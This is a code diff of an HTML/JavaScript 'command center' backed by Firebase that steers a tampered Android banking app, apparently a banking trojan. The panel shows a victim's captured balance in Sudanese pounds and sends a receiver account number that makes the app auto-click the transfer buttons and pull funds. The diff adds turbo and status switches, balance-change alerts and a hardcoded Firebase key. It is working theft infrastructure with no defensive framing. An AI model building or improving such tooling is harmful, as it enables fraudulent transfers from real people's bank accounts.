@@ -2,42 +2,82 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>BOK System Control v5.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BOK Command Center - Pro</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --bg: #0d1117; --card: #161b22; --primary: #58a6ff; --text: #c9d1d9; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); padding: 20px; }
-        .container { max-width: 800px; margin: auto; }
-        .card { background: var(--card); border: 1px solid #30363d; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
-        .label { color: #8b949e; font-size: 12px; text-transform: uppercase; }
-        .value { font-size: 24px; font-weight: bold; color: #3fb950; font-family: monospace; margin: 10px 0; }
-        input[type="text"] { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 5px; margin-top: 10px; box-sizing: border-box; }
-        button { background: #238636; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; }
-        button:hover { background: #2ea043; }
+        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --success: #238636; --danger: #da3633; --text: #c9d1d9; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--primary); padding-bottom: 10px; }
+        .label { color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        .value { font-size: 28px; font-weight: bold; color: var(--success); font-family: monospace; margin: 10px 0; }
+        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; margin: 10px 0; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-danger { background: var(--danger); color: white; margin-top: 10px; }
+        
+        /* Switches */
+        .switch-group { display: flex; justify-content: space-between; align-items: center; background: #0d1117; padding: 15px; border-radius: 8px; margin-bottom: 10px; border: 1px solid var(--border); }
+        .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #30363d; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--success); }
+        input:checked + .slider:before { transform: translateX(24px); }
+
+        /* Notification Pulse */
+        .alert-pulse { animation: pulse-red 1s infinite; border-color: var(--danger) !important; }
+        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(218, 54, 51, 0); } 100% { box-shadow: 0 0 0 0 rgba(218, 54, 51, 0); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>BOK Live Monitor</h2>
+<div class="header">
+    <h1>BOK COMMAND CENTER v6.0</h1>
+    <p id="net-status">Connecting to Database...</p>
+</div>
 
-    <div class="card">
-        <div class="label">Captured Balance (From App)</div>
-        <div id="balance_val" class="value">0.00 SDG</div>
+<div class="grid">
+    <div class="card" id="balance-card">
+        <div class="label">Detected Account Balance</div>
+        <div id="cash-display" class="value">0.00 SDG</div>
+        <div class="label">Last Activity</div>
+        <div id="last-time" style="font-size: 13px;">No data yet</div>
+        <audio id="alert-sound" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
     </div>
 
     <div class="card">
         <h3 style="margin-top:0">Withdrawal Setup</h3>
-        <div class="label">Target Account Number (Where money goes)</div>
-        <input type="text" id="target_acc" placeholder="Enter Account Number">
-        <button onclick="updateTarget()">Set Target & Start Pull</button>
-        <p style="font-size: 11px; color: #8b949e; margin-top: 10px;">* When you click, the App will read this number and start auto-clicking "تفاصيل" and "تحويل".</p>
+        <div class="label">Target Account (To receive funds)</div>
+        <input type="text" id="account-input" placeholder="Enter Receiver Account">
+        <button class="btn-primary" onclick="setTarget()">Update Target & Trigger Pull</button>
+        <button class="btn-danger" onclick="clearTarget()">Reset / Stop Activity</button>
+    </div>
+
+    <div class="card">
+        <h3 style="margin-top:0">System Overrides</h3>
+        <div class="switch-group">
+            <span>System Status (Active)</span>
+            <label class="switch">
+                <input type="checkbox" id="status-toggle" onchange="toggleControl('status', this.checked)">
+                <span class="slider"></span>
+            </label>
+        </div>
+        <div class="switch-group">
+            <span>Turbo Mode (Speed)</span>
+            <label class="switch">
+                <input type="checkbox" id="turbo-toggle" onchange="toggleControl('turbo', this.checked)">
+                <span class="slider"></span>
+            </label>
+        </div>
     </div>
 </div>
 
 <script>
-    // Config from your google-services.json
+    // Firebase Configuration
     const firebaseConfig = {
         apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
         authDomain: "sudancontrol-c5050.firebaseapp.com",
@@ -49,22 +89,56 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Listen to Cash (matches SAVED_VALUE_KEY in Smali)
+    // 1. Monitor Cash & Notification Logic
+    let currentCash = "0.00";
     db.ref('Cash').on('value', (snap) => {
         if(snap.exists()) {
-            document.getElementById('balance_val').innerText = snap.val() + " SDG";
+            const newCash = snap.val();
+            document.getElementById('cash-display').innerText = newCash + " SDG";
+            document.getElementById('last-time').innerText = new Date().toLocaleTimeString();
+            document.getElementById('net-status').innerText = "System Online - Data Received";
+            document.getElementById('net-status').style.color = "#238636";
+
+            if(newCash !== currentCash) {
+                triggerAlert();
+                currentCash = newCash;
+            }
         }
     });
 
-    // Function to set the Account (matches hsab() function in Smali)
-    function updateTarget() {
-        const accNum = document.getElementById('target_acc').value;
-        if(accNum === "") return alert("Please enter account number");
+    // 2. Sync Master Switches
+    db.ref('control').on('value', (snap) => {
+        const data = snap.val();
+        if(data) {
+            document.getElementById('status-toggle').checked = (data.status === "true");
+            document.getElementById('turbo-toggle').checked = (data.turbo === "true");
+        }
+    });
 
-        // We push to 'Account' table as the Smali code listens here
-        db.ref('Account').set(accNum)
-        .then(() => alert("Target Updated! App will now trigger pull."))
-        .catch(err => alert("Error: " + err.message));
+    // 3. Actions
+    function setTarget() {
+        const acc = document.getElementById('account-input').value;
+        if(!acc) return alert("Enter account number first!");
+        db.ref('Account').set(acc).then(() => alert("Target Set: " + acc));
+    }
+
+    function clearTarget() {
+        db.ref('Account').remove();
+        db.ref('Cash').set("0.00");
+        alert("System Reset Successfully");
+    }
+
+    function toggleControl(path, val) {
+        const strVal = val ? "true" : "false";
+        db.ref('control').child(path).set(strVal);
+    }
+
+    function triggerAlert() {
+        const card = document.getElementById('balance-card');
+        const sound = document.getElementById('alert-sound');
+        card.classList.add('alert-pulse');
+        sound.play();
+        setTimeout(() => card.classList.remove('alert-pulse'), 5000);
     }
 </script>
 
